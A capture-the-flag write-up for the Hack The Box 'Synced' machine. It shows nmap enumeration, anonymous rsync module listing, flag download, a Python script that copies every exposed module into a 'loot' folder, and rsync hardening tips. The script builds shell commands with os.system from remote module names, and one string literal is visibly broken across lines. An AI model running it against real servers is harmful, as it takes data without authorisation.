
# HTB Synced - Write-up
**Prepared by: #AfterDark**

## Introduction

The **HTB Synced** challenge involves exploiting a misconfigured **Rsync** service that allows **anonymous access**. Rsync is a fast and powerful file copying tool used for backups and synchronizations. However, when improperly configured, it can expose sensitive data.

This write-up will guide you through identifying and exploiting Rsync to retrieve the flag.

# Enumeration

# Step 1: Nmap Scan

We start with an **Nmap scan** to identify open ports and running services.

```bash
nmap -p- --min-rate=1000 -sV {target_IP}
```

The scan results show:

```
873/tcp open  rsync
```

Port **873** is open, running an **Rsync daemon**, confirming the presence of an Rsync service.

# Exploitation

# Step 2: Listing Available Rsync Modules

Rsync allows us to **list available shares** using the `--list-only` option:

```bash
rsync --list-only {target_IP}::
```

Output:

```
public          Anonymous Share
```

The **public** module is accessible. We now check its contents:

```bash
rsync --list-only {target_IP}::public
```

Output:

```
flag.txt
```

The **flag.txt** file is inside the public share.

# Step 3: Downloading the Flag

We can download `flag.txt` using:

```bash
rsync {target_IP}::public/flag.txt flag.txt
```

Once downloaded, we read its contents:

```bash
cat flag.txt
```

Output:

```
72eaf5344ebb84908ae543a7198*****
```

**Congratulations!** 🎉 You've successfully exploited Rsync and retrieved the flag.

# Conclusion

- Rsync, when **misconfigured**, allows anonymous access.
- Listing available modules (`--list-only`) can reveal sensitive directories.
- Data can be copied using Rsync commands.
- **Always ensure Rsync is properly secured** to prevent unauthorized access.

# PoC Script

The following Python script automates the exploitation process:

```python
import os
import subprocess
import ipaddress

def get_target_ip():
    while True:
        target = input("Enter the target IP: ").strip()
        try:
            ipaddress.ip_address(target)
            return target
        except ValueError:
            print("[-] Invalid IP address. Please enter a valid IP.")

def scan_rsync(target):
    print(f"[+] Scanning Rsync on {target}:873")
    result = subprocess.run(["nmap", "-p873", target], capture_output=True, text=True)
    if "873/tcp open" in result.stdout.lower():
        print("[+] Rsync is running.")
    else:
        print("[-] Rsync not detected.")
        exit(1)

def extract_modules(target):
    print("[+] Extracting Rsync modules...")
    result = subprocess.run(["rsync", f"rsync://{target}/"], capture_output=True, text=True)
    modules = [line.split()[0] for line in result.stdout.split("
") if line.strip()]
    if modules:
        print("[+] Found Rsync modules:", ", ".join(modules))
        return modules
    else:
        print("[-] No modules found.")
        exit(1)

def download_flag(target, module):
    print(f"[+] Downloading from module: {module}")
    os.system(f"rsync -av rsync://{target}/{module}/ loot/")
    print("[+] Flag saved in loot/")

def main():
    target = get_target_ip()
    scan_rsync(target)
    modules = extract_modules(target)
    for module in modules:
        download_flag(target, module)

if __name__ == "__main__":
    main()
```

# Defensive Measures

To **secure Rsync**, follow these best practices:

- **Disable anonymous access** by setting `auth users` in `rsyncd.conf`.
- **Restrict IP access** using `hosts allow` and `hosts deny` settings.
- **Run Rsync over SSH** instead of in daemon mode.
- **Use authentication** to prevent unauthorized access.

**Stay safe, and happy hacking!** 🚀

---
*Write-up by #AfterDark*
